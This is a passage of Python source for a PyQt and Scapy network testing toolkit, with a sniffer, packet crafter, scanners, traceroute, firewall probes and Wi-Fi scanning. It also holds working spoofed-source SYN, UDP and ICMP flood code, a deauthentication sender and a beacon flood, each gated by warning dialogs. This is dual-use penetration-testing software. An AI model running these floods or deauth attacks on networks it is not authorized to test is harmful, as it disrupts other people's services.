                    field_item = QTreeWidgetItem([field_name, display_value])
                    layer_item.addChild(field_item)

                layer_item.setExpanded(True)
                current_layer = current_layer.payload

            self.packet_details_tree.resizeColumnToContents(0)

        except (ValueError, IndexError):
            self.packet_details_tree.addTopLevelItem(QTreeWidgetItem(["Error displaying packet details."]))
        except Exception as e:
            logging.error(f"Unexpected error in display_packet_details: {e}", exc_info=True)
            self.packet_details_tree.addTopLevelItem(QTreeWidgetItem([f"Error: {e}"]))

    def clear_sniffer_display(self):
        self.packet_list_widget.clear(); self.packet_details_tree.clear(); self.packet_hex_view.clear(); self.packets_data.clear(); logging.info("Sniffer display cleared.")

    def save_packets(self):
        """Saves captured packets to a pcap file."""
        if not self.packets_data: QMessageBox.information(self, "Info", "There are no packets to save."); return
        file_path, _ = QFileDialog.getSaveFileName(self, "Save Packets", "", "Pcap Files (*.pcap *.pcapng);;All Files (*)")
        if file_path:
            try: wrpcap(file_path, self.packets_data); self.status_bar.showMessage(f"Saved {len(self.packets_data)} packets to {file_path}")
            except Exception as e: QMessageBox.critical(self, "Error", f"Failed to save packets: {e}")

    def load_packets(self):
        """Loads packets from a pcap file into the sniffer view."""
        if self.packets_data and QMessageBox.question(self, "Confirm", "Clear captured packets?", QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) == QMessageBox.StandardButton.No: return
        self.clear_sniffer_display()
        file_path, _ = QFileDialog.getOpenFileName(self, "Load Packets", "", "Pcap Files (*.pcap *.pcapng);;All Files (*)")
        if file_path:
            try:
                loaded_packets = rdpcap(file_path)
                for packet in loaded_packets: self.add_packet_to_list(packet)
                self.status_bar.showMessage(f"Loaded {len(loaded_packets)} packets from {file_path}")
            except Exception as e: QMessageBox.critical(self, "Error", f"Failed to load packets: {e}")

    def crafter_add_layer(self):
        """Adds a new protocol layer to the packet being crafted."""
        proto_name = self.proto_to_add.currentText()
        if proto_name in AVAILABLE_PROTOCOLS:
            self.packet_layers.append(AVAILABLE_PROTOCOLS[proto_name]())
            self.crafter_rebuild_layer_list(); self.layer_list_widget.setCurrentRow(len(self.packet_layers) - 1)

    def crafter_remove_layer(self):
        """Removes the selected protocol layer from the packet."""
        if (row := self.layer_list_widget.currentRow()) >= 0:
            del self.packet_layers[row]; self.crafter_rebuild_layer_list(); self.crafter_clear_fields_display()

    def crafter_toggle_fuzz_layer(self):
        """Toggles fuzzing on the selected layer."""
        row = self.layer_list_widget.currentRow()
        if row < 0:
            QMessageBox.information(self, "Info", "Please select a layer to fuzz/unfuzz.")
            return

        layer = self.packet_layers[row]

        # Use hasattr to reliably check for fuzzed layers (duck typing)
        if hasattr(layer, 'obj'):
            # It's already fuzzed, so unfuzz it by replacing it with its original object
            self.packet_layers[row] = layer.obj
        else:
            # It's a normal layer, so wrap it with fuzz()
            self.packet_layers[row] = fuzz(layer)

        self.crafter_rebuild_layer_list()
        self.layer_list_widget.setCurrentRow(row)

    def crafter_rebuild_layer_list(self):
        """Updates the UI list of layers from the internal self.packet_layers."""
        self.layer_list_widget.clear()
        for i, layer in enumerate(self.packet_layers):
            if hasattr(layer, 'obj'):
                # Display fuzzed layers differently
                self.layer_list_widget.addItem(f"{i}: Fuzzed({layer.obj.name})")
            else:
                self.layer_list_widget.addItem(f"{i}: {layer.name}")
        self.crafter_update_packet_summary()

    def crafter_load_template(self, name):
        if self.packet_layers and QMessageBox.question(self, "Confirm", "Clear current packet stack?", QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) == QMessageBox.StandardButton.No: return
        self.packet_layers = [copy.deepcopy(l) for l in PACKET_TEMPLATES[name]]
        self.crafter_rebuild_layer_list()
        if self.packet_layers: self.layer_list_widget.setCurrentRow(0)

    def crafter_clear_fields_display(self):
        for widget in self.current_field_widgets: widget.deleteLater()
        self.current_field_widgets = []

    def crafter_display_layer_fields(self, row):
        self.crafter_clear_fields_display()
        if not (0 <= row < len(self.packet_layers)): return

        layer = self.packet_layers[row]

        if hasattr(layer, 'obj'):
            self.scroll_area.setEnabled(False)
            label = QLabel("Fields are not editable for fuzzed layers.")
            label.setAlignment(Qt.AlignmentFlag.AlignCenter)
            self.fields_layout.addWidget(label)
            self.current_field_widgets.append(label)
            return

        self.scroll_area.setEnabled(True)
        for field in layer.fields_desc:
            container = QWidget(); hbox = QHBoxLayout(container); hbox.setContentsMargins(0,0,0,0)
            hbox.addWidget(QLabel(f"{field.name}:"))
            if isinstance(layer, TCP) and field.name == "flags":
                flags_widget = QWidget(); flags_layout = QHBoxLayout(flags_widget)
                self.tcp_flag_vars = {}
                for flag in "FSRPAUEC":
                    var = QCheckBox(flag); self.tcp_flag_vars[flag] = var
                    if flag in str(layer.flags): var.setChecked(True)
                    var.stateChanged.connect(lambda state, l=layer: self.crafter_update_tcp_flags(l))
                    flags_layout.addWidget(var)
                hbox.addWidget(flags_widget)
            else:
                le = QLineEdit(str(getattr(layer, field.name, ''))); le.editingFinished.connect(lambda l=layer, f=field.name, w=le: self.crafter_update_field(l, f, w.text()))
                hbox.addWidget(le)
            self.fields_layout.addWidget(container); self.current_field_widgets.append(container)

    def crafter_update_tcp_flags(self, layer):
        layer.flags = "".join([f for f, v in self.tcp_flag_vars.items() if v.isChecked()])
        self.crafter_update_packet_summary()

    def crafter_update_field(self, layer, field_name, text):
        try: setattr(layer, field_name, text)
        except: pass
        self.crafter_update_packet_summary()

    def build_packet(self):
        if not self.packet_layers: return None

        # Avoid deepcopying fuzz objects, as it can cause crashes.
        layers = []
        for l in self.packet_layers:
            if hasattr(l, 'obj'):
                layers.append(l)  # Use the fuzz object directly
            else:
                layers.append(copy.deepcopy(l))  # Deepcopy standard layers

        if not layers: return None

        pkt = layers[0]
        for i in range(1, len(layers)):
            pkt /= layers[i]
        return pkt

    def crafter_update_packet_summary(self):
        try: pkt = self.build_packet(); summary = pkt.summary() if pkt else "No layers."
        except Exception as e: summary = f"Error: {e}"
        self.crafter_summary.setPlainText(summary)

    def crafter_send_packet(self):
        """Starts the thread to send the crafted packet(s)."""
        if not self.packet_layers:
            QMessageBox.critical(self, "Error", "No packet layers to build a packet from.")
            return
        try:
            count, interval = int(self.send_count_edit.text()), float(self.send_interval_edit.text())
        except ValueError:
            QMessageBox.critical(self, "Error", "Invalid count or interval.")
            return
        self.send_results_widget.clear()
        self.send_btn.setEnabled(False)
        self.send_cancel_btn.setEnabled(True)
        self.tool_stop_event.clear()
        self.worker = WorkerThread(self._send_thread, args=(count, interval)); self.worker.start()

    def _send_thread(self, c, i):
        iface = self.get_selected_iface()
        q = self.tool_results_queue
        try:
            ans_list = []
            unans_list = []
            for pkt_num in range(c):
                if self.tool_stop_event.is_set():
                    logging.info("Packet sending cancelled.")
                    break

                pkt = self.build_packet()
                if not pkt:
                    logging.error("Failed to build packet in send thread.")
                    break

                send_receive_func = srp1 if pkt.haslayer(Ether) else sr1
                reply = send_receive_func(pkt, timeout=2, iface=iface, verbose=0)
                if reply:
                    ans_list.append((pkt, reply))
                else:
                    unans_list.append(pkt)
                time.sleep(i)
            q.put(('send_results', ans_list, unans_list))
        except Exception as e:
            logging.error("Send packet failed", exc_info=True)
            q.put(('error', 'Send Error', str(e)))
        finally:
            q.put(('send_finished',))

    def start_traceroute(self):
        """Starts the traceroute worker thread."""
        if self.is_tool_running: QMessageBox.warning(self, "Busy", "Another tool is already running."); return
        t = self.trace_target.text()
        if not t: QMessageBox.critical(self, "Error", "Please enter a target."); return
        self.trace_button.setEnabled(False)
        self.trace_cancel_button.setEnabled(True)
        self.is_tool_running = True
        self.tool_stop_event.clear()
        self.worker = WorkerThread(self._traceroute_thread, args=(t,)); self.worker.start()

    def _traceroute_thread(self,t):
        q=self.tool_results_queue; iface=self.get_selected_iface()
        logging.info(f"Traceroute thread started for target: {t} on iface: {iface}")
        try:
            q.put(('trace_status',f"Resolving {t}...")); dest_ip=socket.gethostbyname(t)
            q.put(('trace_clear',)); q.put(('trace_result',("",f"Traceroute to {t} ({dest_ip})","","")))
            for i in range(1,30):
                if self.tool_stop_event.is_set():
                    q.put(('trace_status', "Traceroute Canceled."))
                    break
                q.put(('trace_status',f"Sending probe to TTL {i}"))
                pkt=IP(dst=dest_ip,ttl=i)/UDP(dport=33434)
                st=time.time(); reply=sr1(pkt,timeout=2,iface=iface); rtt=(time.time()-st)*1000
                if reply is None: q.put(('trace_result',(i,"* * *","Timeout","")))
                else:
                    h_ip=reply.src
                    try: h_name,_,_=socket.gethostbyaddr(h_ip)
                    except socket.herror: h_name="Unknown"
                    q.put(('trace_result',(i,h_ip,h_name,f"{rtt:.2f}")))
                    if reply.type==3 or h_ip==dest_ip: q.put(('trace_status',"Trace Complete.")); break
            else: q.put(('trace_status',"Trace Finished (Max hops reached)."))
        except Exception as e: logging.error("Exception in traceroute thread",exc_info=True); q.put(('error',"Traceroute Error",str(e)))
        finally: q.put(('tool_finished','traceroute')); logging.info("Traceroute thread finished.")

    def start_port_scan(self):
        """Starts the port scanner worker thread."""
        if self.is_tool_running: QMessageBox.warning(self, "Busy", "Another tool is already running."); return
        t=self.scan_target.text(); ps=self.scan_ports.text(); use_frags=self.scan_frag_check.isChecked()

        scan_protocols = []
        if self.scan_proto_tcp_radio.isChecked(): scan_protocols.append("TCP")
        if self.scan_proto_udp_radio.isChecked(): scan_protocols.append("UDP")
        if self.scan_proto_both_radio.isChecked(): scan_protocols.extend(["TCP", "UDP"])

        tcp_scan_type = self.tcp_scan_type_combo.currentText() if self.tcp_scan_type_combo.isVisible() else "SYN Scan"

        if not t or not ps: QMessageBox.critical(self, "Error", "Target and ports required."); return
        try: ports=sorted(list(set(self._parse_ports(ps))))
        except ValueError: QMessageBox.critical(self, "Error","Invalid port format. Use '22, 80, 100-200'."); return

        self.scan_button.setEnabled(False)
        self.scan_cancel_button.setEnabled(True)
        self.is_tool_running=True
        self.tool_stop_event.clear()

        args = (t, ports, scan_protocols, tcp_scan_type, use_frags)
        self.worker = WorkerThread(self._port_scan_thread, args=args); self.worker.start()

    def _parse_ports(self,ps):
        ports=[]
        for part in ps.split(','):
            part=part.strip()
            if '-' in part: start,end=map(int,part.split('-')); ports.extend(range(start,end+1))
            else: ports.append(int(part))
        return ports

    def _port_scan_thread(self,t,ports,scan_protocols,tcp_scan_type,use_frags):
        q=self.tool_results_queue; iface=self.get_selected_iface()
        logging.info(f"Port scan started: T={t}, P={ports}, Protocols={scan_protocols}, TCP_Mode={tcp_scan_type}, Frags={use_frags}")
        scan_results = []
        try:
            q.put(('scan_clear',))
            total_ports = len(ports) * len(scan_protocols)
            ports_scanned = 0

            tcp_scan_flags = {
                "SYN Scan": "S", "FIN Scan": "F", "Xmas Scan": "FPU",
                "Null Scan": "", "ACK Scan": "A"
            }

            for protocol in scan_protocols:
                if self.tool_stop_event.is_set(): break
                for port in ports:
                    if self.tool_stop_event.is_set(): break

                    ports_scanned += 1
                    status_msg = f"Scanning {t}:{port} ({protocol}"
                    if protocol == "TCP": status_msg += f"/{tcp_scan_type}"
                    status_msg += f") - {ports_scanned}/{total_ports}"
                    q.put(('scan_status', status_msg))

                    pkt = None
                    if protocol == "TCP":
                        flags = tcp_scan_flags.get(tcp_scan_type, "S")
                        pkt = IP(dst=t)/TCP(dport=port, flags=flags)
                    elif protocol == "UDP":
                        pkt = IP(dst=t)/UDP(dport=port)

                    if not pkt: continue

                    probes = fragment(pkt) if use_frags else [pkt]
                    # Only need one response, not for every fragment
                    resp=sr1(probes[0] if len(probes) == 1 else probes, timeout=1, iface=iface, verbose=0)
                    state = "No Response / Filtered"
                    if resp:
                        if resp.haslayer(TCP):
                            if resp.getlayer(TCP).flags == 0x12: state = "Open" # SYN-ACK
                            elif resp.getlayer(TCP).flags == 0x14: state = "Closed" # RST-ACK
                            elif resp.getlayer(TCP).flags == 0x4: state = "Unfiltered (RST)" # RST from ACK scan
                        elif resp.haslayer(UDP):
                            state = "Open | Filtered" # UDP is connectionless, open might not respond
                        elif resp.haslayer(ICMP) and resp.getlayer(ICMP).type == 3:
                            if resp.getlayer(ICMP).code in [1, 2, 3, 9, 10, 13]:
                                state = "Filtered"
                            else:
                                state = "Closed (ICMP)"

                    service = "Unknown"
                    if state.startswith("Open"):
                        try: service=socket.getservbyport(port, protocol.lower())
                        except OSError: pass

                    # Add to list for final popup and also to queue for live view
                    result_tuple = (f"{port}/{protocol.lower()}", state, service)
                    scan_results.append(result_tuple)
                    q.put(('scan_result', result_tuple))

            if self.tool_stop_event.is_set():
                q.put(('scan_status', "Scan Canceled."))
            else:
                q.put(('scan_status',"Scan Complete."))
                q.put(('show_port_scan_popup', scan_results, t)) # New message for popup
        except Exception as e: logging.error("Exception in port scan thread",exc_info=True); q.put(('error',"Scan Error",str(e)))
        finally: q.put(('tool_finished','scanner')); logging.info("Port scan thread finished.")

    def start_arp_scan(self):
        """Starts the ARP scan worker thread."""
        if self.is_tool_running: QMessageBox.warning(self, "Busy", "Another tool is already running."); return
        t=self.arp_target.text()
        if not t: QMessageBox.critical(self, "Error", "Please enter a target network."); return
        self.arp_scan_button.setEnabled(False); self.is_tool_running=True
        self.worker = WorkerThread(self._arp_scan_thread, args=(t,)); self.worker.start()

    def _arp_scan_thread(self,t):
        q=self.tool_results_queue; iface=self.get_selected_iface()
        logging.info(f"ARP scan thread started for target: {t} on iface: {iface}")
        try:
            q.put(('arp_status', f"Scanning {t}...")); q.put(('arp_clear',))
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=t)
            ans,unans=srp(pkt,timeout=2,iface=iface,verbose=0)

            # Keep adding to tree for live results
            answered_results_for_tree = [{'ip': r.psrc, 'mac': r.hwsrc, 'status': 'Responded'} for s, r in ans]
            if answered_results_for_tree:
                q.put(('arp_results', answered_results_for_tree))

            # Now prepare results for popup
            popup_results = []
            q.put(('arp_status', f"Found {len(ans)} hosts. Resolving vendors..."))
            for i, (s, r) in enumerate(ans):
                q.put(('arp_status', f"Resolving vendor for {r.hwsrc} ({i+1}/{len(ans)})"))
                vendor = get_vendor(r.hwsrc)
                popup_results.append({'ip': r.psrc, 'mac': r.hwsrc, 'vendor': vendor})

            total_found = len(ans)
            q.put(('arp_status',f"Scan Complete. Found {total_found} active hosts."))
            q.put(('show_arp_scan_popup', popup_results, t)) # New message for popup

        except Exception as e: logging.error("Exception in ARP scan thread",exc_info=True); q.put(('error',"ARP Scan Error",str(e)))
        finally: q.put(('tool_finished','arp_scan')); logging.info("ARP scan thread finished.")

    def start_ping_sweep(self):
        if self.is_tool_running:
            QMessageBox.warning(self, "Busy", "Another tool is already running.")
            return

        target_network = self.ps_target_edit.text()
        probe_type = self.ps_probe_type_combo.currentText()
        ports_str = self.ps_ports_edit.text()

        try:
            net = ipaddress.ip_network(target_network, strict=False)
            timeout = float(self.ps_timeout_edit.text())
            num_threads = int(self.ps_threads_edit.text())
            ports = [int(p.strip()) for p in ports_str.split(',')] if ports_str else []
        except ValueError as e:
            QMessageBox.critical(self, "Input Error", f"Invalid input: {e}")
            return

        if ("TCP" in probe_type or "UDP" in probe_type) and not ports:
            QMessageBox.critical(self, "Input Error", "Please specify at least one port for TCP/UDP probes.")
            return

        self.is_tool_running = True
        self.ps_start_button.setEnabled(False)
        self.ps_cancel_button.setEnabled(True)
        self.tool_stop_event.clear()
        self.ps_tree.clear()

        args = (net, probe_type, ports, timeout, num_threads)
        self.worker = WorkerThread(self._ping_sweep_thread, args=args)
        self.worker.start()

    def _ping_sweep_thread(self, net, probe_type, ports, timeout, num_threads):
        """Master thread that populates a queue and starts worker threads."""
        q = self.tool_results_queue
        logging.info(f"Ping sweep started for {net} with {probe_type} on ports {ports}")

        hosts_queue = queue.Queue()
        for host in net.hosts():
            hosts_queue.put(str(host))

        if hosts_queue.qsize() == 0:
            q.put(('ps_status', "Sweep Complete (No hosts in range)."))
            q.put(('tool_finished', 'ping_sweep'))
            return

        self.ps_finished_threads = 0
        self.active_threads = []

        for i in range(num_threads):
            worker = WorkerThread(target=self._ping_sweep_worker, args=(hosts_queue, probe_type, ports, timeout, num_threads))
            self.active_threads.append(worker)
            worker.start()

    def _ping_sweep_worker(self, hosts_queue, probe_type, ports, timeout, num_threads):
        """Worker function that each ping sweep thread executes."""
        q = self.tool_results_queue
        while not self.tool_stop_event.is_set():
            try:
                host_str = hosts_queue.get_nowait()
            except queue.Empty:
                break # Queue is empty, this thread is done

            q.put(('ps_status', f"Pinging {host_str}..."))

            reply = None
            try:
                if probe_type == "ICMP Echo":
                    pkt = IP(dst=host_str)/ICMP()
                    reply = sr1(pkt, timeout=timeout, verbose=0, iface=self.get_selected_iface())
                elif probe_type == "TCP SYN":
                    for port in ports:
                        pkt = IP(dst=host_str)/TCP(dport=port, flags="S")
                        reply = sr1(pkt, timeout=timeout, verbose=0, iface=self.get_selected_iface())
                        if reply and reply.haslayer(TCP) and reply.getlayer(TCP).flags == 0x12: # SYN-ACK
                            break # Host is up, no need to check other ports
                elif probe_type == "TCP ACK":
                    for port in ports:
                        pkt = IP(dst=host_str)/TCP(dport=port, flags="A")
                        reply = sr1(pkt, timeout=timeout, verbose=0, iface=self.get_selected_iface())
                        if reply and reply.haslayer(TCP) and reply.getlayer(TCP).flags == 0x4: # RST
                            break # Host is up, no need to check other ports
                elif probe_type == "UDP Probe":
                    for port in ports:
                        pkt = IP(dst=host_str)/UDP(dport=port)
                        reply = sr1(pkt, timeout=timeout, verbose=0, iface=self.get_selected_iface())
                        if reply and reply.haslayer(ICMP) and reply.getlayer(ICMP).type == 3: # Dest Unreachable
                            break # Port is closed, but host is up.
            except Exception as e:
                logging.warning(f"Probe to {host_str} failed: {e}")


            if reply:
                q.put(('ps_result', (host_str, "Host is up")))

        # Signal that this worker is done
        q.put(('ps_worker_finished', num_threads))

    def load_flood_packet(self):
        packet=self.build_packet()
        if not packet: QMessageBox.critical(self, "Error", "Please craft a packet in the Packet Crafter tab first."); return
        self.loaded_flood_packet=packet
        self.flood_packet_label.setText(f"Loaded: {self.loaded_flood_packet.summary()}")
        logging.info(f"Loaded flood packet: {self.loaded_flood_packet.summary()}")

    def start_flood(self):
        """Starts the packet flooder worker threads."""
        if self.is_tool_running:
            QMessageBox.warning(self, "Busy", "Another tool is already running.")
            return

        template = self.flood_template_combo.currentText()
        if template == "Custom (from Crafter)" and not self.loaded_flood_packet:
            QMessageBox.critical(self, "Error", "Please load a packet from the crafter first.")
            return

        warning_msg = "WARNING: This tool sends a high volume of packets and can disrupt network services. Only use this tool on networks you own or have explicit permission to test. Misuse of this tool may be illegal.\n\nDo you accept responsibility and wish to continue?"
        if not QMessageBox.question(self, "Ethical Use Warning", warning_msg, QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) == QMessageBox.StandardButton.Yes:
            return

        try:
            count = int(self.flood_count.text())
            interval = float(self.flood_interval.text())
            num_threads = int(self.flood_threads.text())
            target_ip = self.flood_target_edit.text()
            target_port = int(self.flood_ports_edit.text()) if self.flood_ports_edit.text() else 80
            random_source = self.flood_rand_src_ip_check.isChecked()
        except ValueError:
            QMessageBox.critical(self, "Error", "Invalid count, interval, or thread number.")
            return

        self.flood_button.setEnabled(False)
        self.stop_flood_button.setEnabled(True)
        self.is_tool_running = True
        self.finished_thread_count = 0
        self.active_threads = []
        self.tool_stop_event.clear()

        packets_per_thread = count // num_threads
        extra_packets = count % num_threads

        flood_params = {
            "template": template, "target_ip": target_ip, "target_port": target_port,
            "random_source": random_source, "custom_packet": self.loaded_flood_packet
        }

        for i in range(num_threads):
            count_for_this_thread = packets_per_thread + (1 if i < extra_packets else 0)
            if count_for_this_thread == 0:
                continue

            worker = WorkerThread(self._flood_thread, args=(flood_params, count_for_this_thread, interval, num_threads))
            self.active_threads.append(worker)
            worker.start()

    def _flood_thread(self, params, count, interval, total_threads):
        q = self.tool_results_queue
        iface = self.get_selected_iface()
        logging.info(f"Flood thread started. Params: {params}, Count: {count}")
        try:
            q.put(('flood_status', f"Flooding with {count} packets..."))
            send_func = sendp # Assume Layer 2 for templates for now

            for i in range(count):
                if self.tool_stop_event.is_set():
                    logging.info("Flood thread detected stop event.")
                    break

                pkt = None
                template = params["template"]

                if template == "Custom (from Crafter)":
                    pkt = params["custom_packet"]
                    send_func = sendp if pkt.haslayer(Ether) else send
                else:
                    # On-the-fly packet creation for templates
                    src_ip = _get_random_ip() if params["random_source"] else "1.2.3.4" # Dummy IP if not random
                    target_ip = params["target_ip"]
                    target_port = params["target_port"]

                    if template == "TCP SYN Flood":
                        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src=src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
                    elif template == "UDP Flood":
                        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src=src_ip, dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / Raw(load=b"X"*1024)
                    elif template == "ICMP Echo Flood":
                        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src=src_ip, dst=target_ip) / ICMP()

                if pkt:
                    send_func(pkt, iface=iface, verbose=0)

                time.sleep(interval)

        except Exception as e:
            logging.error("Exception in flood thread", exc_info=True)
            q.put(('error', "Flood Error", str(e)))
        finally:
            q.put(('flood_thread_finished', total_threads))
            logging.info("A flood thread finished.")

    def start_krack_scan(self):
        iface = self.get_selected_iface()
        if not iface:
            QMessageBox.warning(self, "Interface Error", "Please select a monitor-mode interface.")
            return

        self.krack_start_btn.setEnabled(False)
        self.krack_stop_btn.setEnabled(True)
        self.krack_results_tree.clear()

        self.krack_thread = KrackScanThread(iface, self)
        self.krack_thread.vulnerability_detected.connect(self.add_krack_result)
        self.krack_thread.start()

    def stop_krack_scan(self):
        if self.krack_thread and self.krack_thread.isRunning():
            self.krack_thread.stop()
            self.krack_thread.wait()
        self.krack_start_btn.setEnabled(True)
        self.krack_stop_btn.setEnabled(False)

    def add_krack_result(self, bssid, client_mac):
        # Avoid adding duplicates
        for i in range(self.krack_results_tree.topLevelItemCount()):
            item = self.krack_results_tree.topLevelItem(i)
            if item.text(0) == bssid and item.text(1) == client_mac:
                return # Already exists

        timestamp = time.strftime('%H:%M:%S')
        item = QTreeWidgetItem([bssid, client_mac, timestamp])
        self.krack_results_tree.addTopLevelItem(item)

    def start_firewall_test(self):
        """Starts the firewall testing worker thread."""
        if self.is_tool_running: QMessageBox.warning(self, "Busy", "Another tool is already running."); return
        t=self.fw_target.text(); ps_name=self.fw_probe_set.currentText()
        if not t: QMessageBox.critical(self, "Error", "Please enter a target."); return
        self.fw_test_button.setEnabled(False); self.is_tool_running=True
        self.worker = WorkerThread(self._firewall_test_thread, args=(t,ps_name)); self.worker.start()

    def _firewall_test_thread(self,t,ps_name):
        q=self.tool_results_queue; iface=self.get_selected_iface()
        logging.info(f"Firewall test thread started for target {t}, probe set {ps_name}")
        try:
            q.put(('fw_clear',)); q.put(('fw_status',f"Testing {ps_name}..."))
            probe_set = FIREWALL_PROBES[ps_name]
            for i, (pkt_builder, desc) in enumerate(probe_set):
                q.put(('fw_status',f"Sending probe {i+1}/{len(probe_set)}: {desc}"))

                pkt = pkt_builder(t)
                pkt_summary = ""

                if isinstance(pkt, list): # It's a fragmented packet
                    pkt_summary = f"{len(pkt)} fragments"
                    ans, unans = sr(pkt, timeout=2, iface=iface, verbose=0)
                    resp = ans[0][1] if ans else None # Take the first response as representative
                else: # It's a single packet
                    pkt_summary = pkt.summary()
                    resp = sr1(pkt, timeout=2, iface=iface, verbose=0)

                result = "Responded" if resp is not None else "No Response / Blocked"
                q.put(('fw_result',(desc, pkt_summary, result)))
            q.put(('fw_status',"Firewall Test Complete."))
        except Exception as e: logging.error("Exception in firewall test thread",exc_info=True); q.put(('error',"Firewall Test Error",str(e)))
        finally: q.put(('tool_finished','fw_tester')); logging.info("Firewall test thread finished.")

    def start_wifi_scan(self):
        """Starts the Wi-Fi scanner and channel hopper threads."""
        if self.is_tool_running: QMessageBox.warning(self, "Busy", "Another tool is already running."); return

        iface = self.get_selected_iface()
        if not iface:
            QMessageBox.warning(self, "Warning", "Please select a wireless interface for scanning.")
            return

        self.wifi_scan_button.setEnabled(False)
        self.wifi_scan_stop_button.setEnabled(True)
        self.is_tool_running = True
        self.found_networks = {}
        self.wifi_tree.clear()

        self.sniffer_thread = SnifferThread(iface=iface, handler=self._wifi_scan_handler, bpf_filter="type mgt subtype beacon or type mgt subtype probe-resp")
        self.sniffer_thread.start()
        self.channel_hopper = ChannelHopperThread(iface)
        self.channel_hopper.start()

        self.tool_results_queue.put(('wifi_scan_status', 'Scanning... Press Stop to finish.'))

        # We can still have a timeout as a safeguard, but the user can now stop it.
        self.scan_timer = QTimer(self)
        self.scan_timer.setSingleShot(True)
        self.scan_timer.timeout.connect(self.stop_wifi_scan)
        self.scan_timer.start(30000) # 30 second safeguard timer

    def _wifi_scan_handler(self, pkt):
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            bssid = pkt[Dot11].addr2
            if bssid not in self.found_networks:
                try: ssid = pkt[Dot11Elt].info.decode(errors="ignore")
                except: ssid = "<Hidden>"
                if not ssid: ssid = "<Hidden>"

                channel = "N/A"
                try:
                    elt = pkt.getlayer(Dot11Elt, ID=3)
                    if elt: channel = ord(elt.info)
                except: pass
                signal = "N/A"
                try: signal = pkt[RadioTap].dbm_antsignal
                except: pass
                self.found_networks[bssid] = (ssid, bssid, channel, signal)
                self.tool_results_queue.put(('wifi_scan_update', self.found_networks[bssid]))

    def stop_wifi_scan(self):
        if hasattr(self, 'scan_timer') and self.scan_timer.isActive():
            self.scan_timer.stop()

        if self.sniffer_thread and self.sniffer_thread.isRunning():
            self.sniffer_thread.stop()
            self.sniffer_thread.wait()
        if self.channel_hopper and self.channel_hopper.isRunning():
            self.channel_hopper.stop()
            self.channel_hopper.wait()

        self.tool_results_queue.put(('wifi_scan_status', 'Scan Finished.'))
        self.tool_results_queue.put(('tool_finished', 'wifi_scan'))

    def start_deauth(self):
        if self.is_tool_running: QMessageBox.warning(self, "Busy", "Another tool is already running."); return
        bssid = self.deauth_bssid.text(); client = self.deauth_client.text()
        try: count = int(self.deauth_count.text())
        except ValueError: QMessageBox.critical(self, "Error", "Count must be an integer."); return
        warning_msg="This will send deauthentication packets which can disrupt a network. Are you sure you want to continue?"
        if QMessageBox.question(self, "Confirm Deauth", warning_msg) == QMessageBox.StandardButton.No: return
        self.deauth_button.setEnabled(False); self.is_tool_running = True
        args = (bssid, client, count)
        self.worker = WorkerThread(self._deauth_thread, args=args); self.worker.start()

    def _deauth_thread(self, bssid, client, count):
        q = self.tool_results_queue; iface = self.get_selected_iface()
        logging.info(f"Deauth thread started: BSSID={bssid}, Client={client}, Count={count}")
        try:
            pkt = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
            q.put(('deauth_status', f"Sending {count} deauth packets..."))
            sendp(pkt, iface=iface, count=count, inter=0.1, verbose=0)
            q.put(('deauth_status', "Deauth packets sent."))
        except Exception as e: logging.error("Exception in deauth thread", exc_info=True); q.put(('error',"Deauth Error",str(e)))
        finally: q.put(('tool_finished','deauth')); logging.info("Deauth thread finished.")

    def start_beacon_flood(self):
        if self.is_tool_running:
            QMessageBox.warning(self, "Busy", "Another tool is already running.")
            return

        iface = self.get_selected_iface()
        if not iface:
            QMessageBox.warning(self, "Interface Error", "Please select a monitor-mode interface.")
            return

        bssid = self.bf_bssid_edit.text()
        enc_type = self.bf_enc_combo.currentText()

        # Handle SSIDs
        ssids = []
        if self.bf_ssid_edit.isReadOnly(): # Loaded from file
            ssids = self.bf_ssid_list
        else:
            ssids = [self.bf_ssid_edit.text().strip()]

        if not ssids or not ssids[0]:
            QMessageBox.critical(self, "Input Error", "Please provide at least one SSID.")
            return

        try:
            count = int(self.bf_count_edit.text())
            interval = float(self.bf_interval_edit.text())
            channel = int(self.bf_channel_edit.text())
            if not (1 <= channel <= 14):
                raise ValueError("Channel must be between 1 and 14.")
        except ValueError as e:
            QMessageBox.critical(self, "Input Error", f"Invalid input for Count, Interval, or Channel: {e}")
            return

        self.is_tool_running = True
        self.bf_start_button.setEnabled(False)
        self.bf_stop_button.setEnabled(True)
        self.tool_stop_event.clear()

        args = (iface, ssids, bssid, count, interval, enc_type, channel)
        self.worker = WorkerThread(self._beacon_flood_thread, args=args)
        self.worker.start()

    def _build_beacon_frame(self, ssid, bssid, channel, enc_type):
        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid)

        cap = 'ESS'
        if enc_type != "Open":
            cap += '+privacy'

        beacon = Dot11Beacon(cap=cap)
        essid = Dot11Elt(ID='SSID', info=ssid)
        ds_param = Dot11Elt(ID='DSset', info=chr(channel))

        frame = RadioTap() / dot11 / beacon / essid / ds_param

        if enc_type == "WEP":
            # WEP is signaled by the privacy bit in the capability field alone.
            pass
        elif enc_type == "WPA2-PSK":
            rsn_info = Dot11Elt(ID='RSNinfo', info=(
                b'\x01\x00'      # RSN Version 1
                b'\x00\x0f\xac\x04'  # Group Cipher Suite: AES (CCMP)
                b'\x01\x00'      # 1 Pairwise Cipher Suite
                b'\x00\x0f\xac\x04'  # AES (CCMP)
                b'\x01\x00'      # 1 Authentication Key Management Suite (AKM)
                b'\x00\x0f\xac\x02'  # PSK
                b'\x00\x00'      # RSN Capabilities
            ))
            frame /= rsn_info
        elif enc_type == "WPA3-SAE":
            rsn_info = Dot11Elt(ID='RSNinfo', info=(
                b'\x01\x00'      # RSN Version 1
                b'\x00\x0f\xac\x04'  # Group Cipher Suite: AES (CCMP)
                b'\x01\x00'      # 1 Pairwise Cipher Suite
                b'\x00\x0f\xac\x04'  # AES (CCMP)
                b'\x01\x00'      # 1 Authentication Key Management Suite (AKM)
